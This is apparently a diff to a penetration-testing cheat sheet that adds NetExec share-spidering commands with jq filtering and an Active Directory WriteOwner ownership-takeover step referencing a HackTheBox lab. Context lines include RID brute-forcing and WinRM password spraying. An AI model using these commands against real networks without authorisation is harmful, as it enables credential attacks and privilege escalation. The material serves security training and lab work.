@@ -149,8 +149,14 @@ net view \\<computername/IP> /all #In Windows, we can view like this
 nxc smb <IP/range>  
 nxc smb <IP> -u username -p password --shares #lists available shares
 nxc smb <IP> -u username -p password -d mydomain --shares #specific domain
+
+# It will save you time before navigating each and every folder
 nxc smb <IP> -u username -p password -d mydomain -M spider_plus # give the list of share with folder and files, Saved inside the .nxc home folder
 nxc smb <IP> -u username -p password -d mydomain -M spider_plus -o EXCLUDE_FOLDER='print$,NETLOGON,SYSVOL,IPC$' # Excluding default shares
+# Output file saved as a <filename>.json file
+cat <filename>.json | jq '. | map_values(keys)'
+cat <filename>.json | jq '. | map_values(keys)' | grep -v 'lnk\|ini'
+
 nxc smb <IP> -u username -p password --users #lists users
 nxc smb <IP> -u 'anonymous' -p '' --rid-brute # Bruteforce to get the usernames
 nxc smb <IP> -u username -p password --all #all information
@@ -242,5 +248,17 @@ bloodhound
 - Check the login with Active Directory with usernames/passwords
 ```bash
 nxc winrm IP -u users.txt -p pass.txt --continue-on-success
+```
+##### WriteOwner Active Directory
+- In the bloodhound, if any object/user has the `WriteOwner` permission, we can own the object
+- Below permissions are referenced from the [HTB-EscapeTwo](https://app.hackthebox.com/machines/EscapeTwo)
+```sh
+         |----Owns(New Permission)-------------------|
+ryan ----|                                           |-----CA_SVC
+         |-----WriteOwner(Existing Persmission)------|
+
+```
+```bash
+Set-DomainObjectOwner -Identity ca_svc -OwnerIdentity ryan
 ```
 
